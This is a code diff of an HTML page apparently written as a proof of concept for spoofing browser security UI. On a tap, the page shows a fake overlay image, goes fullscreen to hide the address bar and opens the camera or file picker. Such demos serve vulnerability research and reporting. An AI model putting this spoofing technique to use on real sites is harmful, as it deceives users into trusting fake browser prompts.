@@ -3,9 +3,7 @@
 <head>
   <title>Security UI Spoof (UX Demo)</title>
   <meta charset="utf-8">
-  <meta name="viewport"
-        content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no"/>
-
+  <meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no"/>
   <style>
     body {
       margin: 0;
@@ -14,6 +12,10 @@
       color: #fff;
       font-family: sans-serif;
       height: 200vh;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      flex-direction: column;
     }
 
     #spoof {
@@ -28,50 +30,44 @@
       pointer-events: none;
     }
 
-    #content {
-      padding-top: 140px;
-      text-align: center;
-    }
-
     input[type=file] {
       display: none;
     }
   </style>
 </head>
-
 <body>
 
 <img id="spoof" src="spof1.png" alt="UI overlay">
-
 <div id="content">
   <h1>Tap anywhere to start demo</h1>
 </div>
 
-<input id="filePicker" type="file" accept="image/*">
+<input id="filePicker" type="file" accept="image/*" capture="environment">
 
 <script>
-document.addEventListener('click', async () => {
+const filePicker = document.getElementById('filePicker');
 
-  /* 1️⃣ Enter fullscreen (omnibar hides) */
-  if (document.documentElement.requestFullscreen) {
-    try {
-      await document.documentElement.requestFullscreen();
-    } catch (e) {}
-  }
-
-  /* 2️⃣ Show spoof overlay */
+document.addEventListener('click', () => {
+  // 1️⃣ Show overlay segera
   document.getElementById('spoof').style.display = 'block';
   document.getElementById('content').style.display = 'none';
 
-  /* 3️⃣ Trigger photo upload (system picker) */
-  setTimeout(() => {
-    document.getElementById('filePicker').click();
-  }, 300);
+  // 2️⃣ Enter fullscreen (tidak menunggu)
+  if (document.documentElement.requestFullscreen) {
+    document.documentElement.requestFullscreen().catch(() => {});
+  }
+
+  // 3️⃣ Trigger file picker langsung dari klik user
+  filePicker.click();
 
 }, { once: true });
 
-document.addEventListener('visibilitychange', () => {
-  console.log('visibility:', document.visibilityState);
+filePicker.addEventListener('change', (e) => {
+  if (filePicker.files.length > 0) {
+    console.log('File selected:', filePicker.files[0].name);
+  } else {
+    console.log('No file selected');
+  }
 });
 </script>
 
